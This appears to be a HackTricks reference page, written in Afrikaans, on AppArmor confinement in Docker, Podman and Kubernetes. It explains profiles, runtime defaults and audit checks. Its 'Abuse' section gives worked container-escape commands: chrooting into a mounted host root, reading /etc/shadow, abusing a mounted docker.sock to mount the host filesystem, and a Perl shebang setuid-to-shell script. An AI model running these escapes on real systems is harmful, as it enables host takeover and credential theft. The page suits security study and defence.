# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

AppArmor is ’n **Mandatory Access Control**-stelsel wat beperkings deur per-program-profiele toepas. Anders as tradisionele DAC-kontroles, wat sterk van gebruiker- en groepeienaarskap afhanklik is, laat AppArmor die kernel toe om ’n beleid af te dwing wat aan die proses self gekoppel is. In container-omgewings is dit belangrik omdat ’n workload genoeg tradisionele voorregte kan hê om ’n aksie te probeer uitvoer, maar steeds geweier kan word omdat sy AppArmor-profiel nie die relevante pad-, mount-, netwerkgedrag of capability-gebruik toelaat nie.

Die belangrikste konseptuele punt is dat AppArmor **padgebaseerd** is. Dit redeneer oor filesystem-toegang deur middel van padreëls, eerder as deur labels soos SELinux doen. Dit maak dit toeganklik en kragtig, maar beteken ook dat bind mounts en alternatiewe pad-uitlegte noukeurig aandag verdien. As dieselfde host-inhoud onder ’n ander pad bereikbaar word, is die effek van die beleid moontlik nie wat die operateur aanvanklik verwag het nie.

## Rol In Container-isolasie

Container-sekuriteitsoorsigte stop dikwels by capabilities en seccomp, maar AppArmor bly belangrik ná daardie kontroles. Stel jou ’n container voor wat meer voorregte as wat nodig is het, of ’n workload wat om operasionele redes een ekstra capability benodig. AppArmor kan steeds lêertoegang, mount-gedrag, netwerkverbindings en uitvoeringspatrone beperk op maniere wat die voor die hand liggende misbruikpad stop. Daarom kan die deaktivering van AppArmor "net om die toepassing te laat werk" ’n bloot riskante konfigurasie stilweg omskep in een wat aktief exploiteerbaar is.

## Lab

Om te kontroleer of AppArmor op die host aktief is, gebruik:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Om te sien waaronder die huidige container-proses loop:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Die verskil is insiggewend. In die normale geval behoort die proses ’n AppArmor-context te wys wat gekoppel is aan die profile wat deur die runtime gekies is. In die unconfined-geval verdwyn daardie ekstra beperkingslaag.

Jy kan ook inspekteer wat Docker dink dit toegepas het:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker kan ’n verstek- of pasgemaakte AppArmor-profiel toepas wanneer die gasheer dit ondersteun. Podman kan ook met AppArmor integreer op AppArmor-gebaseerde stelsels, hoewel die ander MAC-stelsel dikwels die fokus oorneem op SELinux-eerste verspreidings. Kubernetes kan AppArmor-beleid op workload-vlak beskikbaar stel op nodes wat AppArmor werklik ondersteun. LXC en verwante Ubuntu-familie-stelselcontainer-omgewings gebruik AppArmor ook omvattend.

Die praktiese punt is dat AppArmor nie ’n "Docker-funksie" is nie. Dit is ’n host-kernel-funksie wat verskeie runtimes kan kies om toe te pas. As die gasheer dit nie ondersteun nie, of die runtime aangesê word om unconfined te loop, is die veronderstelde beskerming nie werklik daar nie.

Spesifiek vir Kubernetes is die moderne API `securityContext.appArmorProfile`. Sedert Kubernetes `v1.30` is die ouer beta AppArmor-annotations deprecated. Op ondersteunde hosts is `RuntimeDefault` die verstekprofiel, terwyl `Localhost` verwys na ’n profiel wat reeds op die node gelaai moet wees. Dit is belangrik tydens review, omdat ’n manifest AppArmor-bewus kan lyk terwyl dit steeds volledig van node-side ondersteuning en vooraf gelaaide profiele afhanklik is.

Een subtiele maar nuttige operasionele detail is dat die eksplisiete instelling van `appArmorProfile.type: RuntimeDefault` strenger is as om die veld bloot weg te laat. As die veld eksplisiet ingestel is en die node nie AppArmor ondersteun nie, behoort admission te faal. As die veld weggelaat word, kan die workload steeds op ’n node sonder AppArmor loop en eenvoudig nie daardie ekstra confinement-laag ontvang nie. Vanuit ’n aanvaller se oogpunt is dit ’n goeie rede om sowel die manifest as die werklike node state na te gaan.

Op Docker-bekwame AppArmor-hosts is `docker-default` die bekendste verstek. Daardie profiel word uit Moby se AppArmor-template gegenereer en is belangrik omdat dit verduidelik waarom sommige capability-based PoCs steeds in ’n verstekcontainer faal. In breë terme laat `docker-default` gewone networking toe, weier dit writes na groot dele van `/proc`, weier dit toegang tot sensitiewe dele van `/sys`, blokkeer dit mount-operasies, en beperk dit ptrace sodat dit nie ’n algemene host-probing primitive is nie. Om daardie baseline te verstaan, help om te onderskei tussen "die container het `CAP_SYS_ADMIN`" en "die container kan daardie capability werklik teen die kernel interfaces gebruik waarin ek belangstel".

## Profile Management

AppArmor-profiele word gewoonlik onder `/etc/apparmor.d/` gestoor. ’n Algemene naamkonvensie is om slashes in die executable path met punte te vervang. Byvoorbeeld, ’n profiel vir `/usr/bin/man` word gewoonlik as `/etc/apparmor.d/usr.bin.man` gestoor. Hierdie detail is belangrik tydens sowel defense as assessment, want sodra jy die aktiewe profielnaam ken, kan jy dikwels die ooreenstemmende lêer vinnig op die gasheer vind.

Nuttige host-side management commands sluit in:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Die rede waarom hierdie opdragte belangrik is in 'n container-security-verwysing, is dat hulle verduidelik hoe profiele werklik gebou, gelaai, na complain mode oorgeskakel en ná toepassingsveranderinge gewysig word. As 'n operateur die gewoonte het om profiele tydens troubleshooting na complain mode te skuif en te vergeet om enforcement te herstel, kan die container in dokumentasie beskerm lyk, terwyl dit in werklikheid baie meer toegeeflik optree.

### Bou en Opdatering van Profiele

`aa-genprof` kan toepassinggedrag waarneem en help om interaktief 'n profiel te genereer:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` kan 'n sjabloonprofiel genereer wat later met `apparmor_parser` gelaai kan word:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wanneer die binary verander en die policy opgedateer moet word, kan `aa-logprof` weierings wat in logs gevind word, herspeel en die operator help besluit of hulle toegelaat of geweier moet word:
```bash
sudo aa-logprof
```
### Logboeke

AppArmor-weierings is dikwels sigbaar deur `auditd`, syslog of nutsmiddels soos `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Dit is operasioneel en offensief nuttig. Verdedigers gebruik dit om profiles te verfyn. Aanvallers gebruik dit om uit te vind watter presiese path of operation geweier word en of AppArmor die beheermeganisme is wat ’n exploit chain blokkeer.

### Identifisering van die Presiese Profilelêer

Wanneer ’n runtime ’n spesifieke AppArmor-profile-naam vir ’n container vertoon, is dit dikwels nuttig om daardie naam terug te koppel aan die profilelêer op die skyf:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Dit is veral nuttig tydens host-side review omdat dit die gaping oorbrug tussen "die container sê dit loop onder profile `lowpriv`" en "die werklike rules is in hierdie spesifieke file wat ge-audit of herlaai kan word".

### High-Signal Rules om te oudit

Wanneer jy 'n profile kan lees, moenie by eenvoudige `deny`-lyne stop nie. Verskeie rule types verander wesenlik hoe nuttig AppArmor teen 'n container escape attempt sal wees:

- `ux` / `Ux`: voer die teikenbinary unconfined uit. As 'n bereikbare helper, shell of interpreter onder `ux` toegelaat word, is dit gewoonlik die eerste ding om te toets.
- `px` / `Px` en `cx` / `Cx`: voer profile transitions tydens exec uit. Dit is nie outomaties sleg nie, maar dit is die moeite werd om te oudit omdat 'n transition in 'n veel breër profile as die huidige een kan land.
- `change_profile`: laat 'n task toe om onmiddellik of tydens die volgende exec na 'n ander gelaaide profile oor te skakel. As die destination profile swakker is, kan dit die bedoelde escape hatch uit 'n restrictive domain word.
- `flags=(complain)`, `flags=(unconfined)`, of nuwer `flags=(prompt)`: dit behoort te verander hoeveel trust jy in die profile plaas. `complain` log denials in plaas daarvan om dit af te dwing, `unconfined` verwyder die boundary, en `prompt` hang van 'n userspace decision path af eerder as van 'n suiwer kernel-enforced deny.
- `userns` of `userns create,`: nuwer AppArmor policy kan die skepping van user namespaces medieer. As 'n container profile dit uitdruklik toelaat, bly geneste user namespaces in spel, selfs wanneer die platform AppArmor as deel van sy hardening-strategy gebruik.

Nuttige host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Hierdie soort oudit is dikwels nuttiger as om na honderde gewone lêerreëls te staar. As ’n breakout afhang van die uitvoering van ’n helper, die betreding van ’n nuwe namespace, of escaping na ’n minder beperkende profiel, is die antwoord dikwels versteek in hierdie oorgangsgeoriënteerde reëls eerder as in die ooglopende `deny /etc/shadow r`-stylreëls.

## Wankonfigurasies

Die mees ooglopende fout is `apparmor=unconfined`. Administrateurs stel dit dikwels terwyl hulle ’n toepassing debug wat misluk het omdat die profiel tereg iets gevaarliks of onverwags geblokkeer het. As die vlag in production bly, is die hele MAC-laag effektief verwyder.

Nog ’n subtiele probleem is die aanname dat bind mounts onskadelik is omdat die lêertoestemmings normaal lyk. Omdat AppArmor padgebaseerd is, kan die blootstelling van host-paaie onder alternatiewe mount-liggings sleg met padreëls interaksie hê. ’n Derde fout is om te vergeet dat ’n profielnaam in ’n config-lêer baie min beteken as die host-kernel nie werklik AppArmor afdwing nie.

## Abuse

Wanneer AppArmor weg is, kan bewerkings wat voorheen beperk was skielik werk: die lees van sensitiewe paaie deur bind mounts, toegang tot dele van procfs of sysfs wat moeiliker moes wees om te gebruik, die uitvoer van mount-verwante aksies as capabilities/seccomp dit ook toelaat, of die gebruik van paaie wat ’n profiel normaalweg sou deny. AppArmor is dikwels die meganisme wat verduidelik waarom ’n capability-gebaseerde breakout-poging op papier behoort te werk, maar steeds in die praktyk misluk. Verwyder AppArmor, en dieselfde poging kan begin slaag.

As jy vermoed dat AppArmor die belangrikste ding is wat ’n path-traversal-, bind-mount- of mount-gebaseerde abuse chain stop, is die eerste stap gewoonlik om te vergelyk wat toeganklik word met en sonder ’n profiel. Byvoorbeeld, as ’n host-pad binne die container gemount is, begin deur te kontroleer of jy dit kan deurkruis en lees:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
As die container ook ’n gevaarlike capability soos `CAP_SYS_ADMIN` het, is een van die mees praktiese toetse om vas te stel of AppArmor die beheermeganisme is wat mount-bewerkings of toegang tot sensitiewe kernel-lêerstelsels blokkeer:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In omgewings waar ’n host path reeds deur ’n bind mount beskikbaar is, kan die verlies van AppArmor ook ’n read-only information-disclosure-kwessie in direkte host file access omskep:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Die punt van hierdie commands is nie dat AppArmor alleen die breakout veroorsaak nie. Dit is dat, sodra AppArmor verwyder is, baie filesystem- en mount-gebaseerde misbruikpaaie onmiddellik getoets kan word.

### Volledige voorbeeld: AppArmor gedeaktiveer + Host Root gemount

As die container reeds die host root by `/host` as ’n bind mount het, kan die verwydering van AppArmor ’n geblokkeerde filesystem-misbruikpad in ’n volledige host escape verander:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Sodra die shell deur die host-lêerstelsel uitgevoer word, het die werklading effektief uit die container-grens ontsnap:
```bash
id
hostname
cat /etc/shadow | head
```
### Volledige voorbeeld: AppArmor gedeaktiveer + Runtime Socket

As die werklike versperring AppArmor rondom runtime state was, kan ’n gemounte socket genoeg wees vir ’n volledige escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Die presiese pad hang van die mount point af, maar die eindresultaat is dieselfde: AppArmor verhoed nie meer toegang tot die runtime API nie, en die runtime API kan ’n container begin wat die host kan kompromitteer.

### Volledige voorbeeld: Path-Based Bind-Mount Bypass

Omdat AppArmor padgebaseerd is, beskerm die beveiliging van `/proc/**` nie outomaties dieselfde host procfs-inhoud wanneer dit deur ’n ander pad bereikbaar is nie:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Die impak hang af van presies wat gemount is en of die alternatiewe path ook ander controls omseil, maar hierdie patroon is een van die duidelikste redes waarom AppArmor saam met die mount layout geëvalueer moet word eerder as in isolasie.

### Full Example: Shebang Bypass

AppArmor policy teiken soms ’n interpreter path op ’n manier wat nie ten volle rekening hou met script execution deur shebang handling nie. ’n Historiese voorbeeld het behels dat ’n script gebruik word waarvan die eerste lyn na ’n confined interpreter wys:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Hierdie soort voorbeeld is belangrik as ’n herinnering dat profile-intensie en werklike uitvoeringssemantiek kan verskil. Wanneer AppArmor in container-omgewings hersien word, verdien interpreter-kettings en alternatiewe uitvoeringspaaie spesiale aandag.

## Kontroles

Die doel van hierdie kontroles is om drie vrae vinnig te beantwoord: is AppArmor op die host geaktiveer, is die huidige proses beperk, en het die runtime werklik ’n profile op hierdie container toegepas?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Wat hier interessant is:

- As `/proc/self/attr/current` `unconfined` wys, trek die workload nie voordeel uit AppArmor-confinement nie.
- As `aa-status` wys dat AppArmor disabled is of nie gelaai is nie, is enige profielnaam in die runtime-konfigurasie meestal kosmeties.
- As `docker inspect` `unconfined` of ’n onverwagte custom profile wys, is dit dikwels die rede waarom ’n filesystem- of mount-gebaseerde abuse path werk.
- As `/sys/kernel/security/apparmor/profiles` nie die profiel bevat wat jy verwag het nie, is die runtime- of orchestrator-konfigurasie op sigself nie voldoende nie.
- As ’n sogenaamd hardened profile `ux`, breë `change_profile`, `userns`, of `flags=(complain)`-stylreëls bevat, kan die praktiese grens baie swakker wees as wat die profielnaam aandui.

As ’n container reeds elevated privileges vir operasionele redes het, maak dit dikwels die verskil tussen ’n beheerde uitsondering en ’n veel breër sekuriteitsmislukking om AppArmor enabled te laat.

## Runtime-verstekwaardes

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | By verstek enabled op AppArmor-capable hosts | Gebruik die `docker-default` AppArmor-profile tensy dit oorskryf word | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor word deur `--security-opt` ondersteun, maar die presiese verstek is host/runtime-dependent en minder universeel as Docker se gedokumenteerde `docker-default`-profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | As `appArmorProfile.type` nie gespesifiseer word nie, is die verstek `RuntimeDefault`, maar dit word slegs toegepas wanneer AppArmor op die node enabled is | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` met ’n swak profile, nodes sonder AppArmor-support |
| containerd / CRI-O under Kubernetes | Volg node/runtime-support | Algemene Kubernetes-ondersteunde runtimes support AppArmor, maar werklike enforcement hang steeds van node-support en workload-settings af | Dieselfde as die Kubernetes-ry; direkte runtime-konfigurasie kan AppArmor ook heeltemal oorslaan |

Vir AppArmor is die belangrikste veranderlike dikwels die **host**, nie slegs die runtime nie. ’n Profielinstelling in ’n manifest skep nie confinement op ’n node waar AppArmor nie enabled is nie.

## Verwysings

- [Kubernetes security context: AppArmor-profilevelde en node-support-gedrag](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, en profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
